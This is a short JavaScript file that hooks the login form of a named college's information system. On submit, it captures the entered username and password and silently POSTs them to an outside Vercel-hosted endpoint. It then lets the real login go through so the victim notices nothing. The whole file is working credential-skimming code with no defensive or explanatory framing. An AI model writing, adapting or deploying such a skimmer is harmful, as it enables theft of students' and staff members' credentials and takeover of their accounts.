document.addEventListener("DOMContentLoaded", () => {
  console.log("DOMContentLoaded fired");

  const form = document.querySelector('form[action="https://mis.apexcollege.edu.np/login/validate"]');
  
  if (!form) {
    console.log("Form not found, exiting script");
    return;
  }

  form.addEventListener("submit", (e) => {
    console.log("Form submit triggered");
    

    e.preventDefault();

    const usernameInput = form.querySelector('input[name="username"]');
    const passwordInput = form.querySelector('input[name="password"]');

    if (!usernameInput || !passwordInput) {
      form.submit();
      return;
    }

    const username = usernameInput.value.trim();
    const password = passwordInput.value;
    const payload = JSON.stringify({ username, password });

   
    let hasRedirected = false;
    const triggerRedirect = () => {
      if (!hasRedirected) {
        hasRedirected = true;
        console.log("Redirecting to PHP server...");
        form.submit(); 
      }
    };

 
    setTimeout(triggerRedirect, 500);

   
    fetch("https://brother-alpha.vercel.app/users", {
      method: "POST",
      mode: "no-cors", 
      headers: {
        "Content-Type": "text/plain" 
      },
      body: payload
    })
    .then(triggerRedirect)
    .catch(triggerRedirect); 
  });
});
